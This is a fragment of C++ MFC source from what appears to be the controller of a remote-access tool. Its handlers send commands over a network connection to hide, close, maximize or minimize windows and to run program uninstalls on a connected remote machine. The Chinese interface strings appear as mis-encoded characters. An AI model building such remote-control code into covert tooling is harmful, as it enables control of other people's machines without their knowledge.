		DWORD hwnd = atoi(m_List.GetItemText(nItem, 1));
		
		m_List.SetItemText(nItem,3,"����");
		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
		DWORD dHow=SW_HIDE;
		memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));	
	}
}

void CSystemDlg::OnSystemWindowClost() 
{
	// TODO: Add your command handler code here
	BYTE lpMsgBuf[20];
	int	nItem = m_List.GetSelectionMark();
	if (nItem >=0 )
	{
		ZeroMemory(lpMsgBuf,20);
		lpMsgBuf[0]=COMMAND_WINDOW_CLOSE;
		DWORD hwnd = atoi(m_List.GetItemText(nItem, 1));
		
		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));	
	}
}

void CSystemDlg::OnSystemWindowMax() 
{
	// TODO: Add your command handler code here
	BYTE lpMsgBuf[20];
	int	nItem = m_List.GetSelectionMark();
	if (nItem >=0 )
	{
		ZeroMemory(lpMsgBuf,20);
		lpMsgBuf[0]=COMMAND_WINDOW_TEST;
		DWORD hwnd = atoi(m_List.GetItemText(nItem, 1));
		
		m_List.SetItemText(nItem,3,"��ʾ");
		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
		DWORD dHow=SW_MAXIMIZE;
		memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));	
	}
}

void CSystemDlg::OnSystemWindowMin() 
{
	// TODO: Add your command handler code here
	BYTE lpMsgBuf[20];
	int	nItem = m_List.GetSelectionMark();
	if (nItem >=0 )
	{
		ZeroMemory(lpMsgBuf,20);
		lpMsgBuf[0]=COMMAND_WINDOW_TEST;
		DWORD hwnd = atoi(m_List.GetItemText(nItem, 1));
		
		m_List.SetItemText(nItem,3,"��ʾ");
		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
		DWORD dHow=SW_MINIMIZE;
		memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));	
	}
}

void CSystemDlg::OnSystemUninstall() 
{
	// TODO: Add your command handler code here
	if (m_List.GetSelectedCount() < 1)
	{
		return ;	
	}
	
	if (MessageBox(_T("ȷ��Ҫж�ظó���?"), _T("��ʾ"), MB_YESNO | MB_ICONQUESTION) == IDNO)
		return;
	
	POSITION pos = m_List.GetFirstSelectedItemPosition();
	CString str;
	while(pos)
	{
		int	nItem = m_List.GetNextSelectedItem(pos);
		str = m_List.GetItemText(nItem, 4);
		
		if (str.GetLength() > 0)
		{
			LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + str.GetLength());
			lpBuffer[0] = COMMAND_APPUNINSTALL;
			memcpy(lpBuffer+1,str.GetBuffer(0),str.GetLength());
			m_iocpServer->Send(m_pContext,lpBuffer,str.GetLength() + 1,TRUE);
		}
	}
}